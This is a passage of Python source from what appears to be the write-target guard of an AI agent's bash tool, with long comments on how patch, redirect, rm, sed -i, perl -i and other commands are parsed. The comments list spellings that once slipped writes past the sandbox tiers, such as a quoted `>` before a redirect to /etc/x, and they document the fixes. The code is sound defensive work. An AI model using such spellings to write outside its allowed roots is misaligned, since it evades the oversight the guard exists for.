    per row holding `ws/f` and `out/f` (both `one`) and a diff turning `one` into `ONE`,
    run from `ws` with the patch file named by absolute path, results read back off disk):

      `patch -i <abs> -d out f`      rc=0  `out/f` = `ONE`, `ws/f` untouched (control)
      `patch -i <abs> -dout f`       rc=0  the same (control, attached)
      `patch -i <abs> -sd out f`     rc=0  the same — the cluster is the same write
      `patch -i <abs> -sdout f`      rc=0  the same, value in its own token
      `patch -i <abs> -so out.txt f` rc=0  `out.txt` holds the text, `f` is untouched
      `patch -i <abs> -soout.txt f`  rc=0  the same, value in its own token
      `patch -i <abs> -so - f`       rc=0  prints to stdout, **no file** named `-`
      `patch -i <abs> -iso out/f f`  rc=2  `too many file arguments`, nothing written
      `patch -i <abs> -isd<out> f`   rc=2  the same — `-i` took the value, no `-d` in force
      `patch -i <abs> -bsdout f`     rc=0  `-b` swallowed `sdout`: cwd's `f` rewritten

    The `-iso`/`-isd` rows are the control that says the scan stops at the **first**
    value-taking letter rather than at the first `d` or `o`: `-i` takes the rest as its
    value, so no destination is in force — and the word `-i` would have eaten must not be
    named either.
    """
    args = _args_after_command(tokens, i)
    found: list[tuple[str, str]] = []
    idx = 0
    while idx < len(args):
        tok = args[idx]
        eaten = 1
        cluster = _short_cluster_option(
            tok, args, idx, _PATCH_CLUSTER_LETTERS, _PATCH_OPTIONAL_ARG_LETTERS
        )
        if cluster is not None:
            letter, value, attached = cluster
            eaten = _words_eaten(attached)
            if value and letter != tok[1]:
                found.append((letter, value))
        idx += eaten
    return found


def _patch_directory_values(tokens: list[str], i: int) -> list[str]:
    """The directory ``-d``/``--directory`` changes into, in the spellings getopt takes.

    It is a **destination** in the sense this walk cares about: measured on this host,
    `patch -d sub v.txt` rewrites `sub/v.txt` and leaves the cwd's copy alone, so the
    value names the directory the write lands in.

    The spaced (``-d sub``), the attached (``-dsub``) and both long forms are read from
    this option's **own** set, so they do not depend on the letters a cluster is split
    with; the clustered spellings come from ``_patch_cluster_values``, which splits them
    with this verb's value-taking letters and reports only clusters. Before that reading
    existed, a clustered `-d` named the *cwd* copy of the operand and nothing else, so
    `patch -sd <outside>/dir <workspace>/f` reached `workspace-write` with **allow**
    while the file really rewritten was the one under the outside directory (#1450).
    """
    named = _short_option_letters(_PATCH_DIRECTORY_OPTIONS)
    out: list[str] = []
    args = _args_after_command(tokens, i)
    idx = 0
    while idx < len(args):
        tok = args[idx]
        eaten = 1
        if tok in _PATCH_DIRECTORY_OPTIONS:
            if idx + 1 < len(args):
                out.append(args[idx + 1])
            eaten = 2          # the directory is the next word, which is therefore not an option
        elif tok.startswith("--directory="):
            out.append(tok.split("=", 1)[1])
        else:
            attached = _leading_short_option_value(tok, named)
            if attached is not None:
                out.append(attached)
            elif tok in _PATCH_OPTIONS_WITH_VALUE:
                # A **spaced** value is the next word, and a word this verb's own option
                # ate is not an option — so it is stepped over, exactly as
                # `_patch_cluster_values` steps over the word a *cluster* letter ate
                # (`_words_eaten`). Without the step, the eaten word is read here as the
                # option it is spelled like and the word *after* it is named as a
                # directory the run never enters: measured, `patch -o -d <dir> f` gives
                # `-o` the out-file `<dir>`, so no chdir is in force and the walk named
                # `<dir>` anyway — a false block of a run that writes nothing there
                # (issue #1464). The set is this verb's own table rather than a letter
                # scan, so a *long* spaced value is stepped over on the same line.
                eaten = 2
            else:
                cluster = _short_cluster_option(
                    tok, args, idx, _PATCH_CLUSTER_LETTERS, _PATCH_OPTIONAL_ARG_LETTERS
                )
                # A **cluster** whose value-taking letter is not the token's head is the
                # only thing this branch adds: a token that leads with that letter is the
                # table's own business above (`-o <file>`), and reading it here as well
                # would be the second reading the step exists to prevent — the arm in
                # `tests/test_bash_tool_patch_targets.py` blinds the table and must be
                # able to bring the eaten word back.
                if cluster is not None and cluster[0] != tok[1]:
                    eaten = _words_eaten(cluster[2])
        idx += eaten
    out.extend(value for letter, value in _patch_cluster_values(tokens, i) if letter in named)
    return out


def _patch_output_values(tokens: list[str], i: int) -> list[str]:
    """The file ``-o``/``--output`` is given **inside a cluster**, when it is.

    `-o` is the other option on this verb that names a path, and it displaces the
    operands — so a cluster the walk missed did not merely go unnamed, it fell through to
    the operand rule and named the **source** instead: measured, `patch -so <out> f`
    rc=0 creates `<out>` and leaves `f` alone, while the walk reported `f`.

    A value of exactly ``-`` is skipped, as the shared reader skips it for the same
    reason here: measured, `patch -so - f` prints the patched text to stdout and creates
    no file named ``-``.

    Only clusters are reported (``_patch_cluster_values`` reads no token's first letter);
    the spaced, attached and long spellings are ``_option_destination_values``'.
    """
    named = _short_option_letters(_PATCH_OUTPUT_OPTIONS)
    return [
        value
        for letter, value in _patch_cluster_values(tokens, i)
        if letter in named and value != "-"
    ]


def _patch_write_targets(tokens: list[str], i: int) -> list[str]:
    """The files ``patch`` writes: its operands, or ``-o``'s value when it is given.

    A run with neither (`patch < d.patch`) writes the paths named **inside the diff**,
    which is content this walk cannot read — the `tar`/`unzip` residual, pinned as a
    measured hole in `tests/test_bash_tool_patch_targets.py` rather than guessed at.
    """
    args = _args_after_command(tokens, i)
    if any(tok in _PATCH_READ_LONG for tok in args):
        return []
    out = _option_destination_values(tokens, i, "patch", options=_PATCH_OUTPUT_OPTIONS)
    # The clustered spelling of that same option, added *before* the operand fallback:
    # an output is what displaces the operands, so a cluster the walk did not read fell
    # through to the rule below and named the source the run only reads.
    out.extend(_patch_output_values(tokens, i))
    if not out:
        out = _positional_args(
            tokens,
            i,
            _PATCH_OPTIONS_WITH_VALUE,
            cluster_optional_arg_letters=_PATCH_OPTIONAL_ARG_LETTERS,
        )
    out.extend(_patch_directory_values(tokens, i))
    return out


# Every word the write-target walk below dispatches on as a verb. It exists so the
# shell's own question can be asked *once*, before a verb spelling is believed: a
# word that is a verb only in spelling, standing where the shell passes it as data,
# is not an invocation and names no target (`_runs_as_a_command`).
_WRITE_VERB_WORDS: frozenset[str] = frozenset().union(
    _REMOVER_VERBS,
    _CREATING_VERBS,
    _DESTINATION_LAST_VERBS,
    _METADATA_VERBS,
    _INPLACE_WRITER_VERBS,
    _COMPRESSOR_VERBS,
    _LZ4_VERBS,
    _PZSTD_VERBS,
    _OPTION_DESTINATION_VERBS,
    {"git", "rsync", "split", "dd", "patch", "sed", "perl", "find", "csplit", "zip"},
)


def _extract_write_targets(cmd: str, _depth: int = 0) -> list[str]:
    """Write targets of ``cmd``: the paths a command appears to write.

    Returns path tokens the command appears to write to:
      - ``rm <path>...`` and ``rmdir <path>`` → the removed paths
      - ``mv`` / ``cp`` / ``ln`` / ``link`` / ``install`` / ``ditto`` → the
        destination (the last operand, or ``-t <dir>`` / ``--target-directory`` in
        every spelling getopt accepts); under ``install -d`` every operand, and
        ``ditto --keepBinariesList <path>`` names that file as well
      - ``> / >> / 2> / &> / >| / <>`` redirects → the redirect target
      - ``touch`` / ``mkdir`` / ``mkfifo`` → every operand (all of them are
        created)
      - ``mknod`` → the first operand (the node it creates; the type and the
        device numbers are read, not written)
      - ``dd of=<path>`` → the ``of=`` value (``if=`` is a read)
      - ``chmod`` / ``chown`` / ``chgrp`` → the operands after the mode/owner
        (or all of them when no operand looks like one, as with
        ``--reference=<f>``)
      - ``gzip`` / ``gunzip`` / ``bzip2`` / ``xz`` / ``lzma`` / ``zstd`` and their
        decompressing twins → every operand, because the default form rewrites the
        operand in place — *unless* the run is a read form (``-c``/``--stdout``,
        ``-t``/``--test``, ``-l``/``--list``, read inside a short cluster too), in
        which case nothing is named and the command stays allowed

    **Parsed, not scanned** (issue #1162). The previous version regex-scanned
    raw text, which failed in both directions:

      - it read a ``>`` *inside a quoted argument* as a redirect, so ordinary
        reads were refused — ``echo "a > b"`` reported target ``'b"'``,
        ``python3 -c "print(1 > 0)"`` reported ``'0)"'``, and any ``->`` in
        prose was a redirect to the next word. Measured on master: 7 of 7
        ordinary read commands blocked, including a ``gh issue create`` whose
        *title* contained ``>`` (which cost the host a retry in a real cycle);
      - it matched verbs by spelling, so ``rm <file>`` (no recursive flag) and
        unlisted writers (``sed -i``, ``truncate``, ``tee``, ``cp`` without
        ``-r``) were not destructive at all — 7 of 7 measured writes allowed.

    Quoting is what distinguishes the two, and the token stream alone is not
    enough to recover it. It knows whether a `>` sat inside a longer argument
    (`echo "a > b"` is one token), but not whether a `>` that stood alone as a
    word was quoted — `'>'` and `>` dequote to the same token. That single gap
    produced both failures of issue #1268, in opposite directions:

      - **under-block**: a quoted operator consumed the next token as its
        `target`, so the *real* redirect's target was never reported — measured
        on master, `echo '>' > /etc/x` produced targets `['>']` and was allowed
        to write `/etc/x` at workspace-write while `echo x > /etc/x` was
        blocked;
      - **over-block**: with no real redirect at all, the quoted operator was
        still read as one, so `grep -n '>' file.txt` was refused under
        `read-only` for "targeting 'file.txt'" although grep never writes it.

    Both are now closed by asking the shell's own question — a quoted word is a
    path, never a redirect (`_fully_quoted_token_indexes`, which recovers the
    fact from a second lex pass with quoting kept). An operator is therefore
    *shape and not quoted*, and operator tokens are skipped when looking for the
    target, so the boundary no longer depends on whether a `>` was quoted.

    What remains is input the two readings disagree about (`echo 'a'b > '>'`), and
    there the walk keeps the safe side in **both** positions (issue #1280). In
    operator position a token is still believed, so a real redirect keeps naming
    the path behind it. In target position the operator-shaped tail of a run is
    *named* rather than believed: a command that really has a second operator
    there is a syntax error in `/bin/sh` and `bash` (measured: `echo x > > out`
    writes nothing) while a quoted path there writes a real file, so naming it
    can only refuse a command that writes nothing — and losing it let `read-only`
    allow a write, which is how #1280 was found.

    Believing an operator-shaped token in *operator* position is the same
    fail-closed direction, and it has the same price: when the quoting sits
    **inside** an operator-shaped word the pairing cannot recover it at all — the
    second reading (`_fully_quoted_token_indexes`'s
    `shlex.shlex(cmd, posix=False, punctuation_chars=True)` with
    `whitespace_split = True`) raises on `echo x 2'>>' log` (`No closing quotation`)
    and differs in word count on `echo x \\> log` (`['echo','x','>','log']` against
    `['echo','x','\\\\','>','log']`) — so both answer "cannot say", and the walk
    names the following word (`log`, `out.txt`) although the shell creates
    nothing: measured in fresh scratch directories, each exits 0 with an empty
    directory, in `/bin/sh` and `/bin/bash` alike. The helper is named because the
    obvious reconstruction is **not** this reading: `shlex.split(cmd, posix=False)`
    does not raise on either line (it returns `['echo', 'x', "2'>>'", 'log']`), so
    a reader who tries it concludes the docstring is wrong about its own guard.
    Filed as issue #1273 rows 1-2
    (row 3, the `git config` value walk, is fixed) and pinned by
    `tests/test_bash_tool_sandbox.py` as a residual with its ground truth rather
    than left to prose: the two rows are refused today, and the change that fixes
    them flips those assertions deliberately.

    Still deliberately non-exhaustive, and the honest boundary stays
    ``enforcement="partial"``: what it does not reach is an **interpreter** or a
    wrapper holding code of its own (`python3 -c 'open(p,"w")'`, `sh script.sh`
    where the script is a file), a verb nobody enumerated, and the spellings the
    two readings disagree about. It is no longer non-exhaustive about the
    *everyday writers*: ``touch``, ``mkdir``, ``ln``, ``install``, ``dd of=``,
    ``chmod``, ``chown`` and ``chgrp`` name their destination above (issue
    #1398). That gap is where "an interpreter can always write a file" stopped
    explaining anything — refusing ``cat > <outside>/f`` while allowing
    ``touch <outside>/f`` was refusing a *shape*, not a *write*.

    An operator's operand is not always a path: the operand of `>&` is a file
    *descriptor* when it is all digits or `-`, so `grep -n x f.txt 2>&1` opens
    nothing and now names no target, instead of being refused for "targeting
    '1'" in the very tier a dirty-tree downgrade uses (`_is_fd_operand`, issue
    #1275). The operator's spelling is what decides it, never the operand alone:
    `&>1` and `echo x > 1` both really write a file called `1` and still name it.

    Heredoc bodies that no shell executes are masked first: a body is text on
    some command's stdin, and reading it as shell code named prose and the
    delimiter word as write targets (`_mask_data_heredoc_bodies`).
    """
    masked = _mask_fd_redirect_prefixes(_mask_data_heredoc_bodies(cmd))
    # The *separator-preserving* tokenizer (see its docstring): the walk below asks a
    # position question now, and `_split_command_tokens` drops a newline separator, so
    # `echo a\\` + newline + `rm -f f` would answer "no separator" about a stream that
    # lost the one the shell acts on.
    tokens = _tokenize_command(masked)
    # A quoted operator is not an operator: `'>'` dequotes to `>`, so the token
    # stream alone cannot say which one the shell will act on. `is_operator` is
    # the one question — shape *and* not quoted — asked wherever the walk needs
    # it, so "is this a redirect?" and "is this an operator rather than a path?"
    # cannot drift apart (issue #1268).
    quoted = _fully_quoted_token_indexes(masked, tokens)
    # `None` is "the two readings disagree", not "nothing is quoted": when the
    # walk cannot say which operator-shaped tokens came from quoting, it keeps the
    # safe side in *both* positions (issue #1280) — the run handling below names
    # the tokens that sit in target position, which is what the old empty set lost.
    quoting_unknown = quoted is None
    quoted = quoted or set()
    # An *escaped* operator-shaped word is a path for the same reason a quoted one
    # is, and it is the half `quoted` cannot see: `>\|` keeps the escape out of the
    # token stream (the plain reading dequotes it to `|`) so the walk read the
    # word as a separator, named no target at all, and `read-only` allowed a write
    # the shell really made (issue #1307, found by a sweep of 88 spellings). Both
    # consultations below are one-directional — an escaped word is never an
    # operator and never a separator — and the recovery answers "cannot say" rather
    # than guessing when the two readings are not known to be the same words.
    escaped = _escaped_word_indexes(masked, tokens)
    # `None` is "cannot say", which is answered by leaving the walk's two questions
    # alone — the escape is a fact about *this* line or it is not claimed at all.
    escaped = escaped or set()

    def is_operator(index: int) -> bool:
        return (index not in quoted and index not in escaped
                and _is_redirect_operator(tokens[index]))

    def is_separator(index: int) -> bool:
        """The shell's word-boundary question, asked with the escape in hand."""
        return index not in escaped and tokens[index] in _COMMAND_SEPARATORS

    targets: list[str] = []
    if quoting_unknown:
        # The two readings disagreed, so an operator-shaped token cannot be told
        # from a quoted path. Operator position keeps the old answer (the walk
        # below still believes it, so a real redirect keeps naming its path);
        # target position is answered here, because that is the direction the old
        # empty-set fallback lost (issue #1280).
        targets.extend(_unresolved_operator_run_tails(tokens, escaped))
    i = 0
    while i < len(tokens):
        tok = tokens[i]
        word = _command_word(tok)
        # Redirects: `>` `>>` `&>` `&>>` `>|` `<>` are their own tokens, and a
        # numeric fd prefix arrives as a separate token (`2` `>` `e`). Which
        # spellings count is `_is_redirect_operator`'s job — this walk only asks.
        if is_operator(i):
            # An operator is never a write target. A *quoted* `>` reaches this
            # walk as an operator token — the tokenizer dequotes, so `'>'` and
            # `>` are the same string here — and taking the next token blindly
            # made the quoted one consume the real redirect's target: measured
            # on master, `echo '>' > /etc/x` yielded targets `['>']` and was
            # ALLOWED at workspace-write (the file was really created outside)
            # while `echo x > /etc/x` was blocked. Skipping operator tokens
            # reports the target the shell will actually write, so the boundary
            # no longer depends on whether a `>` was quoted.
            j = i + 1
            while j < len(tokens) and is_operator(j):
                j += 1
            if j < len(tokens) and not is_separator(j):
                # …but the operand of `>&` is not always a path: when it is all
                # digits or `-` the shell duplicates onto that descriptor and
                # opens nothing (`2>&1`, `2>&-`). Recording it made ordinary
                # read-only diagnostics — `grep -n x f.txt 2>&1` — refusals for
                # "targeting '1'" in the one tier whose documented recovery flow
                # is to run read commands from inside it (issue #1275). The
                # operator's spelling decides this, never the operand alone:
                # `&>1` writes a real file called `1` and `echo x > 1` writes it
                # too, so both keep naming their target here.
                if not (tokens[i] == ">&" and _is_fd_operand(tokens[j])):
                    targets.append(tokens[j])
                i = j + 1
                continue
        elif word in _WRITE_VERB_WORDS and not _runs_as_a_command(tokens, i):
            # A verb *spelling* is not an invocation. The walk below visits every
            # token and matches its word against the verb sets wherever it stands,
            # which is what reaches `sudo rm` and `find . -exec rm`; the cost was
            # that a verb word the shell passes as *data* was believed too.
            # `_runs_as_a_command` is the guard's own rule for the difference and
            # is already the question the git-mutator scan asks: a separator, a
            # grouping operator, `!`, a shell keyword, a wrapper prefix or a
            # `VAR=value` puts a word in command position; anything else is an
            # argument of whatever the command really is.
            pass
        elif word in _REMOVER_VERBS:
            # Any operand is removed — NOT only with a recursive flag.
            # `rm a.txt` destroys uncommitted work exactly like `rm -rf dir`;
            # whether the delete recurses does not decide whether the file
            # survives. `unlink` is the same claim one file at a time, and it
            # was invisible to this walk until `_REMOVER_VERBS` named it.
            targets.extend(_positional_args(tokens, i))
        elif word == "git":
            # `--output=<file>` is the diff-family readers' shared redirect:
            # `git diff --output=<f>` truncates and writes <f> exactly as
            # `> <f>` does. Scoped to a git invocation because the tokenizer
            # dequotes — a token `--output=x` is textually identical whether
            # git would read it as an option or it sits inside quotes.
            targets.extend(_git_output_flag_targets(tokens, i))
            # `git config` names the file it writes as an *operand*, not as a
            # shell redirect, so no redirect in the command reaches it: the
            # `--file <p>` / `-f <p>` operand and the global/system config behind
            # `--global` / `--system`. See `_git_config_write_targets`.
            targets.extend(_git_config_write_targets(tokens, i))
        elif word in _DESTINATION_LAST_VERBS:
            args = _positional_args(tokens, i, _VERB_OPTIONS_WITH_VALUE[word])
            t_dir = _target_directory_values(tokens, i, word)
            if word in _DIRECTORY_INSTALL_VERBS and _is_directory_install(tokens, i):
                # `install -d <dir>...` creates *every* operand; the last-operand
                # rule would read it as one directory plus its neighbours.
                targets.extend(args)
                targets.extend(t_dir)
            elif t_dir:
                # `-t <dir>` / `--target-directory=<dir>` moves the destination
                # out of the operand list altogether and turns every operand into
                # a source — so the two readings are alternatives, not additions:
                # measured, `ln -t <outside> inside_src` named the *source* under
                # the last-operand rule, and `ln -t <outside> a b` would have
                # named `b`.
                targets.extend(t_dir)
            elif len(args) >= 2:
                targets.append(args[-1])
            # A verb here whose *option* also names a file it creates: `ditto
            # --keepBinariesList <path>` writes that file beside the destination,
            # so unlike `-t <dir>` and unlike `patch -o` these two readings are
            # **additions**, not alternatives — both are named.
            extra = _DESTINATION_LAST_OPTION_TARGETS.get(word)
            if extra:
                targets.extend(_option_destination_values(tokens, i, word, extra))
        elif word == "rsync":
            # `rsync SRC... DEST` is `cp` over a network: the last operand is the
            # destination, and it is rewritten — unless the run is a read form
            # (`-n`/`--dry-run`/`--list-only`), which writes nothing at all.
            if not _rsync_run_is_a_read(tokens, i):
                args = _positional_args(
                    tokens, i, _RSYNC_OPTIONS_WITH_VALUE, _RSYNC_SHORT_VALUE_LETTERS
                )
                # A single operand is a *listing* of the source, not a copy.
                if len(args) >= 2:
                    targets.append(args[-1])
        elif word == "split":
            # `split` writes a family of derived chunks; the last operand is the
            # prefix they all share, and it is the only operand that is written
            # (see `_SPLIT_OPTIONS_WITH_VALUE`). One operand is the *input* alone —
            # the chunks then land on the default prefix `xaa…` in the cwd, which no
            # operand spells — so a single-operand reading names nothing rather than
            # naming the file it is reading.
            args = _positional_args(tokens, i, _SPLIT_OPTIONS_WITH_VALUE)
            if len(args) >= 2:
                targets.append(args[-1])
        elif word in _CREATING_VERBS:
            # Every operand is created or updated — `touch a b c` stamps three
            # files, `mkdir -p a/b` creates one, `mkfifo a b` makes two. Nothing
            # here is a source.
            args = _positional_args(tokens, i, _VERB_OPTIONS_WITH_VALUE[word])
            if word in _FIRST_OPERAND_CREATING_VERBS:
                # `mknod <name> <type> [<major> <minor>]` — only the name is
                # created; the type and the numbers are read.
                args = args[:1]
            targets.extend(args)
        elif word == "dd":
            # `dd of=<path>` is dd's only destination and it sits in no operand
            # position, so no operand rule reaches it. `if=` is a read and is
            # deliberately not named (`dd if=<outside>/f` writes nothing).
            targets.extend(_dd_output_targets(tokens, i))
        elif word in _METADATA_VERBS:
            targets.extend(_metadata_write_targets(tokens, i, word))
        elif word == "patch":
            # `patch` rewrites the files it is pointed at and named nothing here in
            # any spelling, so it lived with the everyday writers (`sed -i`,
            # `truncate`, the compressors) that an empty target list made invisible
            # to both tiers. The rule — operands, or `-o`'s value when that is given,
            # plus `-d`'s directory, and nothing at all under `--dry-run` — is stated
            # with its measurements in `_patch_write_targets`.
            targets.extend(_patch_write_targets(tokens, i))
        elif word in _INPLACE_WRITER_VERBS:
            targets.extend(_positional_args(tokens, i))
        elif word in _COMPRESSOR_VERBS:
            # `gzip f` rewrites f in place; the read spellings (`gzip -c f`,
            # `gzip -t f`, `gzip -l f`) leave it alone and must stay allowed.
            # This gate is why the family is not simply in the set above. A bare
            # `-` operand is the family's stdin/stdout spelling and is dropped
            # one operand at a time, because `gzip - f` really does compress `f`
            # — see `_without_the_stream_operand`.
            if not _compressor_operand_is_a_read(tokens, i):
                targets.extend(
                    _without_the_stream_operand(
                        _positional_args(tokens, i, _COMPRESSOR_OPTIONS_WITH_VALUE)
                    )
                )
        elif word in _LZ4_VERBS:
            # `lz4 f` writes `f.lz4` beside the operand rather than rewriting it,
            # `lz4 -m f g` writes two siblings, and `lz4 f out.lz4` writes the
            # last operand — unless the run is one of the measured read forms.
            targets.extend(_lz4_write_targets(tokens, i))
        elif word in _PZSTD_VERBS:
            # `pzstd f` writes `f.zst` beside the operand and keeps `f` — `lz4`'s
            # shape — and `pzstd -o <file> f` writes the destination instead. Its
            # own rule, because `-o` is an option-position write the operand rules
            # cannot reach and the attached `-o<file>` spells a read letter inside
            # the path. Measured table in `_PZSTD_VERBS`' comment.
            targets.extend(_pzstd_write_targets(tokens, i))
        elif word == "zip":
            # `zip A.zip f` creates or rewrites `A.zip`, and the archive is the
            # *first* operand — the end no other operand rule reads, so the run
            # named nothing at all and both tiers allowed it (issue #1420's
            # remaining row). The rule, its measured table and its two named
            # limits are in `_zip_write_targets`.
            targets.extend(_zip_write_targets(tokens, i))
        elif word == "sed":
            # `sed -i` rewrites its file operands in place; a bare `sed` is a
            # filter that writes only to stdout and must stay allowed. The flag
            # may carry a suffix (`-i.bak`), so test the prefix.
            args = _args_after_command(tokens, i)
            if any(t == "-i" or t.startswith("-i") for t in args):
                # The first operand of `sed` is the *script*, not a file —
                # only the operands after it are rewritten. Naming the script
                # (`sed -i s/a/b/ f.txt` → `s/a/b/`) would point the block at
                # something that is not a path.
                targets.extend(_positional_args(tokens, i)[1:])
        elif word == "perl":
            # `perl -i` rewrites its file operands in place — the same family as
            # the `sed -i` branch above, and the member that was missing: with an
            # empty target list the loop that judges targets never ran, so
            # `perl -i -pe 's/a/b/' <outside>/f` was ALLOW at both tiers while
            # `sed -i` on the same path was refused. A bare `perl` is a filter
            # that writes only to stdout and must stay allowed. The flag may sit
            # in a cluster (`-pi`) and carry a suffix (`-i.bak`), so the token is
            # scanned rather than compared.
            args = _args_after_command(tokens, i)
            if any(_perl_inplace_flag(t) for t in args):
                targets.extend(_perl_replacement_operands(tokens, i))
        elif word == "find":
            # `find <paths> ... -delete` removes every match; the paths it was
            # pointed at are the work at risk. Without `-delete` a `find` is a
            # read and must stay allowed (issue #1162 listed `-delete` as an
            # allowed destructive write on master).
            args = _args_after_command(tokens, i)
            if "-delete" in args:
                targets.extend(_positional_args(tokens, i))
        elif word == "csplit":
            # `csplit` writes a family of derived paths — `<prefix>00`, `<prefix>01`,
            # … — and it was invisible to this walk in every spelling: an empty target
            # list is allowed by construction, so the loop that judges targets never
            # ran. Measured on master `910a307c`, predicate only, nothing executed, the
            # prefix outside every allowed root: all six spellings (`-f` leading, `-f`
            # attached, `-f` trailing, none at all, an in-workspace prefix, and BSD's
            # unaccepted `--prefix`) named nothing at both tiers, while `cp` on the same
            # two paths was refused.
            #
            # Ground truth from a scratch directory on this host (BSD `csplit`, usage
            # line `csplit [-ks] [-f prefix] [-n number] file args ...`), read back off
            # disk afterwards: `csplit -f pfx in.txt 4 8` created `pfx00 pfx01 pfx02`
            # beside `in.txt`; `csplit in.txt 4` created `xx00 xx01` — the **default**
            # prefix, in the cwd; `csplit -n 3 -f n3 in.txt 4` created `n3000 n3001`;
            # and `csplit -f - in.txt 3` created `-00 -01`.
            #
            # Only the prefix is named. Its first operand is an input to *read*, and the
            # arguments after it are patterns or line numbers — `csplit f /two/` carries
            # a `/`-shaped token that is not a path, so naming it would point the block
            # at something that does not exist and naming the input would refuse a read.
            # The prefix is named rather than the chunks themselves even though those
            # carry digits (`pfx00`), because every chunk is under the prefix and the
            # tier verdict is the same for the prefix as for the family.
            #
            # The default `xx` **is** named, which is the half the table above cannot
            # reach: unlike a splitter whose prefix is an optional last *operand* — where
            # naming the default means naming the input, so the rule that graduates
            # `split` names nothing there (#1430) — csplit's prefix is never an operand,
            # so naming its documented default cannot name a read, and leaving it
            # unnamed would keep this hole open for the shortest spelling of all.
            #
            # A run whose operand list is empty writes nothing — usage, `--help`,
            # `--version`, and flags with no file each measured to create nothing — so
            # the prefix is named only when there is an operand to split, which keeps
            # this arm reading like the rest of the walk: a flag alone names no path.
            # What it does not do is `stat` anything: a file operand that does not exist
            # also makes csplit write nothing (measured), and that run is still refused
            # under `read-only`, because placing a target never depended on the disk.
            args = _positional_args(tokens, i, _CSPLIT_OPTIONS_WITH_VALUE)
            if args:
                targets.extend(
                    _option_destination_values(
                        tokens,
                        i,
                        "csplit",
                        cluster_letters=_OPTION_DESTINATION_VALUE_TAKING["csplit"],
                    )
                    or ["xx"]
                )
        elif word in _OPTION_DESTINATION_VERBS:
            # `curl -o <f>` / `wget -O <f>` / `sort -o <f>` / `unzip -d <d>`: the
            # destination is an option's value, so no operand rule reaches it and
            # the walk named nothing at all — an empty target list is allowed by
            # construction, so both tiers allowed the write. The letters a verb
            # takes a value for are what let a *cluster* (`curl -so <f>`) be split
            # by its own grammar; a verb absent from that table keeps the residual
            # rather than a guess (see `_OPTION_DESTINATION_VALUE_TAKING`).
            targets.extend(
                _option_destination_values(
                    tokens,
                    i,
                    word,
                    cluster_letters=_OPTION_DESTINATION_VALUE_TAKING.get(
                        word, frozenset()
                    ),
                )
            )
        i += 1
    # Reach the same places the git-mutator scan reaches: a destructive
    # command the shell will run is judged wherever it is written (issue
    # #1234). `_nested_command_texts` is the same over-approximating walk
    # `_find_git_mutator` uses, capped at the same depth, so the two rules
    # cannot drift apart again.
    if _depth < 3:
        for nested in _nested_command_texts(tokens):
            for t in _extract_write_targets(nested, _depth + 1):
                if t not in targets:
                    targets.append(t)
    return targets


def _short_target_directory(
    tok: str, args: list[str], j: int, table: frozenset
) -> tuple[str | None, bool] | None:
    """The ``-t`` value a *short-option* token carries, and whether it rode in the token.

    ``None`` when the token is no short-option cluster under this verb's letters;
    otherwise the pair ``(value, attached)``, where ``attached`` False means the
    token's value-taking letter took the **next word** — and ``value`` is ``None``
    unless that letter was ``t`` (a letter that is not ``t`` carries a value this
    reader does not name).

    The pair, and the reason it is not filtered to ``t`` here, is the step its caller
    owes that next word (`_words_eaten`): a reader that answered ``None`` for a token
    whose letter was not ``t`` lost the fact that a word had been *eaten*, and the walk
    around it re-read that word as an option — naming a path the run never writes
    (issue #1455). Answering for every cluster is what lets the caller pay the same
    step the rest of the walk pays; only ``letter == "t"`` ever contributes a path.

    getopt does not require an option's value to be a separate word, so ``-t``
    has three spellings beyond the bare token: the value rides in the same token
    (``-t<dir>``), or the ``t`` sits in a cluster behind a flag (``-rt <dir>``,
    ``-Dt<dir>``). Reading only the bare ``-t`` token missed all of them, and an
    unnamed destination is an ALLOW whatever the tier — measured on GNU
    (``debian:bookworm-slim``) in one directory outside every allowed root, all
    of ``cp x -t<dir>``, ``mv x -t<dir>``, ``install -m 644 x -t<dir>``,
    ``install -Dt <dir> x``, ``cp -rt <dir> x`` and ``ln -s x -t<dir>`` deliver
    the file into ``<dir>`` (rc=0, the name read back off disk), while the walk
    named *no* target at all. BSD's ``cp``/``ln`` have no ``-t`` (the host is
    macOS), which is why the ground truth is measured on GNU rather than here.

    Scanning stops at the first letter that itself takes a value, because the
    rest of that token is *its* value (``-mD`` is a mode of ``D``, not a ``-t``).
    The letters come from the verb's own table — ``_VERB_OPTIONS_WITH_VALUE``,
    already the per-verb fact this walk reads — so this introduces no new
    enumeration of a command's flags (the #461 class the walk keeps refusing),
    and the scan itself is ``_short_cluster_option``'s, shared with the operand
    reader so the two cannot drift. ``t`` is added to those letters because this
    function is also reached for ``link``, whose table is empty by design yet
    whose verb is read by the destination rules (``_DESTINATION_LAST_VERBS``).
    """
    cluster = _short_cluster_option(
        tok, args, j, _short_option_letters(table) | {"t"}
    )
    if cluster is None:
        return None
    letter, value, attached = cluster
    return (value if letter == "t" else None, attached)


def _target_directory_values(tokens: list[str], i: int, verb: str) -> list[str]:
    """The directory named by ``-t``/``--target-directory``, in every spelling.

    ``ln``, ``link``, ``install``, ``cp`` and ``mv`` all take it, and it is a
    *destination*: the operand it displaces is a source, so a rule that reads
    only "the last operand" names the wrong one of the two. It is read here
    rather than added to ``_OPTIONS_WITH_VALUE`` because that table is consulted
    for every verb the walk reads, while ``-t``'s meaning is per-verb (issue
    #1398). The spaced and ``=``-joined long forms were covered first; the two
    short forms ``-t<dir>`` and a cluster's trailing ``t`` are read by
    ``_short_target_directory``, which takes ``verb``'s own table to know where a
    cluster's value-taking letters are.

    A ``--`` that no option consumed ends option parsing here too. The two readers
    answer one question and one walk reads both, so the sentence is applied in both
    rather than in whichever one a cycle happened to be working in. Its ground truth
    is the one measured for that reader: every verb in both tables is a getopt
    program, for which ``--`` is *defined* to end options. This table's own verbs
    cannot be executed for it on this host — ``cp``/``mv``/``ln`` here implement no
    ``-t`` at all (``cp -t OUT/f -- src.txt`` exits 64 with the usage line, measured),
    so the spelling is pinned as a predicate and no executed arm is claimed for it.

    A word a value-taking letter **eats** is stepped over (`_words_eaten`), whichever
    letter ate it (issue #1455). This reader walked with `enumerate`, so a `-t` that
    another letter had already consumed was read as an option anyway and named the word
    *after* it. Measured 2026-09-20 on this host, one fresh directory per row, the
    listing read back off disk (both rows are commands this host's tools **refuse**, so
    the run writes nothing at all while the walk named a path):

      ``install -m -t OUT src``       rc=71  ``install: OUT: No such file or directory``,
                                             nothing created · walk named ``OUT``
      ``cp -S -t OUT src.txt``        rc=64  ``cp: illegal option -- t``, nothing created
                                             · walk named ``OUT``

    With the step neither names ``OUT``: ``-m``/``-S`` consume the ``-t``, so the token
    names no directory, and the walk reads the operands as the family's own rule does —
    the last operand is the destination (``src``, ``src.txt``), which is the path the
